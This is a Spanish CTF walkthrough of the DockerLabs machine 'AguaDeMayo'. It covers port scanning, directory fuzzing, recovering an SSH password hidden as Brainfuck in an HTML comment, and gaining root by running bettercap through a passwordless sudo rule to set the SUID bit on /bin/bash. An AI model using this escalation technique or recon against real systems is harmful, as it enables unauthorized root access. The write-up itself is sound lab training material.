---
title: "DockerLabs - AguaDeMayo"
difficulty: "Fácil"
source: "DockerLabs"
---

Máquina orientada a practicar enumeración web e intrusión, con escalada de privilegios en Linux.

## Despliegue

```bash
bash auto_deploy.sh aguademayo.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos detectados:
- **22/tcp** — SSH (OpenSSH)
- **80/tcp** — HTTP (Apache, página por defecto)

## Enumeración Web

Fuzzing de directorios:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

Ruta encontrada: `/images` — contiene la imagen `agua_ssh.jpg`.

El nombre de la imagen revela el usuario SSH: **`agua`**.

### Código Brainfuck en el HTML

En el código fuente de la página principal (`Ctrl+U`) se encuentra un comentario oculto con código Brainfuck:

```
<!--
++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
-->
```

Decodificado con dcode.fr/brainfuck-language → **`bebeaguaqueessano`**

## Intrusión

```bash
ssh agua@172.17.0.2
# contraseña: bebeaguaqueessano
```

## Escalada de Privilegios

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/bettercap
```

El usuario `agua` puede ejecutar `bettercap` como root sin contraseña.

Explotación mediante abuso de bettercap para activar SUID en bash:

```bash
sudo bettercap -eval '!bash'

# Dentro de bettercap, activar SUID en /bin/bash
!chmod u+s /bin/bash

exit

bash -p
whoami
# root
```

## Conclusión

La máquina combina esteganografía social (nombre de imagen como pista de usuario) con ofuscación de contraseña mediante Brainfuck en el HTML. La escalada aprovecha bettercap en sudoers para activar el bit SUID en bash.
